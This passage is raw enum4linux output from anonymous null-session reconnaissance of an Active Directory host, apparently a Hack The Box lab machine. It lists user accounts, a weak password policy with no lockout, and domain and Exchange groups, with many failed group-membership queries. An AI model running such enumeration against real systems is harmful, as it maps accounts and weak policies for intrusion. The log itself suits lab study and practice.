user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 ========================================== 
|    Share Enumeration on 10.129.215.16    |
 ========================================== 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.215.16

 ===================================================== 
|    Password Policy Information for 10.129.215.16    |
 ===================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.129.215.16' 2>&1


[+] Attaching to 10.129.215.16 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.129.215.16)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] HTB
	[+] Builtin

[+] Password Info for Domain: HTB

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.129.215.16' -c "getdompwinfo" 2>&1

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 =============================== 
|    Groups on 10.129.215.16    |
 =============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.129.215.16' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Certificate Service DCOM Access' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Certificate Service DCOM Access' (RID: 574) has member: Could not connect to server 10.129.215.16
Group 'Certificate Service DCOM Access' (RID: 574) has member: The username or password was not correct.
Group 'Certificate Service DCOM Access' (RID: 574) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Storage Replica Administrators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Storage Replica Administrators' (RID: 582) has member: Could not connect to server 10.129.215.16
Group 'Storage Replica Administrators' (RID: 582) has member: The username or password was not correct.
Group 'Storage Replica Administrators' (RID: 582) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Access Control Assistance Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Access Control Assistance Operators' (RID: 579) has member: Could not connect to server 10.129.215.16
Group 'Access Control Assistance Operators' (RID: 579) has member: The username or password was not correct.
Group 'Access Control Assistance Operators' (RID: 579) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Event Log Readers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Event Log Readers' (RID: 573) has member: Could not connect to server 10.129.215.16
Group 'Event Log Readers' (RID: 573) has member: The username or password was not correct.
Group 'Event Log Readers' (RID: 573) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Remote Access Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'RDS Remote Access Servers' (RID: 575) has member: Could not connect to server 10.129.215.16
Group 'RDS Remote Access Servers' (RID: 575) has member: The username or password was not correct.
Group 'RDS Remote Access Servers' (RID: 575) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Account Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Account Operators' (RID: 548) has member: Could not connect to server 10.129.215.16
Group 'Account Operators' (RID: 548) has member: The username or password was not correct.
Group 'Account Operators' (RID: 548) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Hyper-V Administrators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Hyper-V Administrators' (RID: 578) has member: Could not connect to server 10.129.215.16
Group 'Hyper-V Administrators' (RID: 578) has member: The username or password was not correct.
Group 'Hyper-V Administrators' (RID: 578) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Management Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'RDS Management Servers' (RID: 577) has member: Could not connect to server 10.129.215.16
Group 'RDS Management Servers' (RID: 577) has member: The username or password was not correct.
Group 'RDS Management Servers' (RID: 577) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Endpoint Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'RDS Endpoint Servers' (RID: 576) has member: Could not connect to server 10.129.215.16
Group 'RDS Endpoint Servers' (RID: 576) has member: The username or password was not correct.
Group 'RDS Endpoint Servers' (RID: 576) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'System Managed Accounts Group' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'System Managed Accounts Group' (RID: 581) has member: Could not connect to server 10.129.215.16
Group 'System Managed Accounts Group' (RID: 581) has member: The username or password was not correct.
Group 'System Managed Accounts Group' (RID: 581) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Desktop Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Remote Desktop Users' (RID: 555) has member: Could not connect to server 10.129.215.16
Group 'Remote Desktop Users' (RID: 555) has member: The username or password was not correct.
Group 'Remote Desktop Users' (RID: 555) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Administrators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Administrators' (RID: 544) has member: Could not connect to server 10.129.215.16
Group 'Administrators' (RID: 544) has member: The username or password was not correct.
Group 'Administrators' (RID: 544) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Replicator' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Replicator' (RID: 552) has member: Could not connect to server 10.129.215.16
Group 'Replicator' (RID: 552) has member: The username or password was not correct.
Group 'Replicator' (RID: 552) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Server Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Server Operators' (RID: 549) has member: Could not connect to server 10.129.215.16
Group 'Server Operators' (RID: 549) has member: The username or password was not correct.
Group 'Server Operators' (RID: 549) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Windows Authorization Access Group' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Windows Authorization Access Group' (RID: 560) has member: Could not connect to server 10.129.215.16
Group 'Windows Authorization Access Group' (RID: 560) has member: The username or password was not correct.
Group 'Windows Authorization Access Group' (RID: 560) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Pre-Windows 2000 Compatible Access' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Could not connect to server 10.129.215.16
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: The username or password was not correct.
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Distributed COM Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Distributed COM Users' (RID: 562) has member: Could not connect to server 10.129.215.16
Group 'Distributed COM Users' (RID: 562) has member: The username or password was not correct.
Group 'Distributed COM Users' (RID: 562) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Terminal Server License Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Terminal Server License Servers' (RID: 561) has member: Could not connect to server 10.129.215.16
Group 'Terminal Server License Servers' (RID: 561) has member: The username or password was not correct.
Group 'Terminal Server License Servers' (RID: 561) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Print Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Print Operators' (RID: 550) has member: Could not connect to server 10.129.215.16
Group 'Print Operators' (RID: 550) has member: The username or password was not correct.
Group 'Print Operators' (RID: 550) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Guests' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Guests' (RID: 546) has member: Could not connect to server 10.129.215.16
Group 'Guests' (RID: 546) has member: The username or password was not correct.
Group 'Guests' (RID: 546) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'IIS_IUSRS' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'IIS_IUSRS' (RID: 568) has member: Could not connect to server 10.129.215.16
Group 'IIS_IUSRS' (RID: 568) has member: The username or password was not correct.
Group 'IIS_IUSRS' (RID: 568) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Management Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Remote Management Users' (RID: 580) has member: Could not connect to server 10.129.215.16
Group 'Remote Management Users' (RID: 580) has member: The username or password was not correct.
Group 'Remote Management Users' (RID: 580) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Network Configuration Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Network Configuration Operators' (RID: 556) has member: Could not connect to server 10.129.215.16
Group 'Network Configuration Operators' (RID: 556) has member: The username or password was not correct.
Group 'Network Configuration Operators' (RID: 556) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Backup Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Backup Operators' (RID: 551) has member: Could not connect to server 10.129.215.16
Group 'Backup Operators' (RID: 551) has member: The username or password was not correct.
Group 'Backup Operators' (RID: 551) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cryptographic Operators' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Cryptographic Operators' (RID: 569) has member: Could not connect to server 10.129.215.16
Group 'Cryptographic Operators' (RID: 569) has member: The username or password was not correct.
Group 'Cryptographic Operators' (RID: 569) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Users' (RID: 545) has member: Could not connect to server 10.129.215.16
Group 'Users' (RID: 545) has member: The username or password was not correct.
Group 'Users' (RID: 545) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Incoming Forest Trust Builders' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Incoming Forest Trust Builders' (RID: 557) has member: Could not connect to server 10.129.215.16
Group 'Incoming Forest Trust Builders' (RID: 557) has member: The username or password was not correct.
Group 'Incoming Forest Trust Builders' (RID: 557) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Monitor Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Performance Monitor Users' (RID: 558) has member: Could not connect to server 10.129.215.16
Group 'Performance Monitor Users' (RID: 558) has member: The username or password was not correct.
Group 'Performance Monitor Users' (RID: 558) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Log Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Performance Log Users' (RID: 559) has member: Could not connect to server 10.129.215.16
Group 'Performance Log Users' (RID: 559) has member: The username or password was not correct.
Group 'Performance Log Users' (RID: 559) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.129.215.16' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Allowed RODC Password Replication Group' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Allowed RODC Password Replication Group' (RID: 571) has member: Could not connect to server 10.129.215.16
Group 'Allowed RODC Password Replication Group' (RID: 571) has member: The username or password was not correct.
Group 'Allowed RODC Password Replication Group' (RID: 571) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'DnsAdmins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'DnsAdmins' (RID: 1101) has member: Could not connect to server 10.129.215.16
Group 'DnsAdmins' (RID: 1101) has member: The username or password was not correct.
Group 'DnsAdmins' (RID: 1101) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Denied RODC Password Replication Group' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Denied RODC Password Replication Group' (RID: 572) has member: Could not connect to server 10.129.215.16
Group 'Denied RODC Password Replication Group' (RID: 572) has member: The username or password was not correct.
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RAS and IAS Servers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'RAS and IAS Servers' (RID: 553) has member: Could not connect to server 10.129.215.16
Group 'RAS and IAS Servers' (RID: 553) has member: The username or password was not correct.
Group 'RAS and IAS Servers' (RID: 553) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cert Publishers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Cert Publishers' (RID: 517) has member: Could not connect to server 10.129.215.16
Group 'Cert Publishers' (RID: 517) has member: The username or password was not correct.
Group 'Cert Publishers' (RID: 517) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.129.215.16' -c "enumdomgroups" 2>&1

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Guests' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Domain Guests' (RID: 514) has member: Could not connect to server 10.129.215.16
Group 'Domain Guests' (RID: 514) has member: The username or password was not correct.
Group 'Domain Guests' (RID: 514) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'View-Only Organization Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'View-Only Organization Management' (RID: 1106) has member: Could not connect to server 10.129.215.16
Group 'View-Only Organization Management' (RID: 1106) has member: The username or password was not correct.
Group 'View-Only Organization Management' (RID: 1106) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Discovery Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Discovery Management' (RID: 1111) has member: Could not connect to server 10.129.215.16
Group 'Discovery Management' (RID: 1111) has member: The username or password was not correct.
Group 'Discovery Management' (RID: 1111) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'ExchangeLegacyInterop' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'ExchangeLegacyInterop' (RID: 1122) has member: Could not connect to server 10.129.215.16
Group 'ExchangeLegacyInterop' (RID: 1122) has member: The username or password was not correct.
Group 'ExchangeLegacyInterop' (RID: 1122) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'DnsUpdateProxy' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'DnsUpdateProxy' (RID: 1102) has member: Could not connect to server 10.129.215.16
Group 'DnsUpdateProxy' (RID: 1102) has member: The username or password was not correct.
Group 'DnsUpdateProxy' (RID: 1102) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Trusted Subsystem' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Exchange Trusted Subsystem' (RID: 1119) has member: Could not connect to server 10.129.215.16
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: The username or password was not correct.
Group 'Exchange Trusted Subsystem' (RID: 1119) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Public Folder Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Public Folder Management' (RID: 1107) has member: Could not connect to server 10.129.215.16
Group 'Public Folder Management' (RID: 1107) has member: The username or password was not correct.
Group 'Public Folder Management' (RID: 1107) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Cloneable Domain Controllers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Cloneable Domain Controllers' (RID: 522) has member: Could not connect to server 10.129.215.16
Group 'Cloneable Domain Controllers' (RID: 522) has member: The username or password was not correct.
Group 'Cloneable Domain Controllers' (RID: 522) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Help Desk' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Help Desk' (RID: 1109) has member: Could not connect to server 10.129.215.16
Group 'Help Desk' (RID: 1109) has member: The username or password was not correct.
Group 'Help Desk' (RID: 1109) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Compliance Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Compliance Management' (RID: 1115) has member: Could not connect to server 10.129.215.16
Group 'Compliance Management' (RID: 1115) has member: The username or password was not correct.
Group 'Compliance Management' (RID: 1115) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Exchange Windows Permissions' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Exchange Windows Permissions' (RID: 1121) has member: Could not connect to server 10.129.215.16
Group 'Exchange Windows Permissions' (RID: 1121) has member: The username or password was not correct.
Group 'Exchange Windows Permissions' (RID: 1121) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Key Admins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Enterprise Key Admins' (RID: 527) has member: Could not connect to server 10.129.215.16
Group 'Enterprise Key Admins' (RID: 527) has member: The username or password was not correct.
Group 'Enterprise Key Admins' (RID: 527) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Schema Admins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Schema Admins' (RID: 518) has member: Could not connect to server 10.129.215.16
Group 'Schema Admins' (RID: 518) has member: The username or password was not correct.
Group 'Schema Admins' (RID: 518) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Records Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Records Management' (RID: 1110) has member: Could not connect to server 10.129.215.16
Group 'Records Management' (RID: 1110) has member: The username or password was not correct.
Group 'Records Management' (RID: 1110) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Hygiene Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Hygiene Management' (RID: 1114) has member: Could not connect to server 10.129.215.16
Group 'Hygiene Management' (RID: 1114) has member: The username or password was not correct.
Group 'Hygiene Management' (RID: 1114) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Admins' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Domain Admins' (RID: 512) has member: Could not connect to server 10.129.215.16
Group 'Domain Admins' (RID: 512) has member: The username or password was not correct.
Group 'Domain Admins' (RID: 512) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Recipient Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Recipient Management' (RID: 1105) has member: Could not connect to server 10.129.215.16
Group 'Recipient Management' (RID: 1105) has member: The username or password was not correct.
Group 'Recipient Management' (RID: 1105) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Controllers' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Domain Controllers' (RID: 516) has member: Could not connect to server 10.129.215.16
Group 'Domain Controllers' (RID: 516) has member: The username or password was not correct.
Group 'Domain Controllers' (RID: 516) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Server Management' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Server Management' (RID: 1112) has member: Could not connect to server 10.129.215.16
Group 'Server Management' (RID: 1112) has member: The username or password was not correct.
Group 'Server Management' (RID: 1112) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Privileged IT Accounts' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Privileged IT Accounts' (RID: 1149) has member: Could not connect to server 10.129.215.16
Group 'Privileged IT Accounts' (RID: 1149) has member: The username or password was not correct.
Group 'Privileged IT Accounts' (RID: 1149) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Service Accounts' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Service Accounts' (RID: 1148) has member: Could not connect to server 10.129.215.16
Group 'Service Accounts' (RID: 1148) has member: The username or password was not correct.
Group 'Service Accounts' (RID: 1148) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Users' -W '' -I '10.129.215.16' -U''%'' 2>&1

Group 'Domain Users' (RID: 513) has member: Could not connect to server 10.129.215.16
Group 'Domain Users' (RID: 513) has member: The username or password was not correct.
Group 'Domain Users' (RID: 513) has member: Connection failed: NT_STATUS_LOGON_FAILURE
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
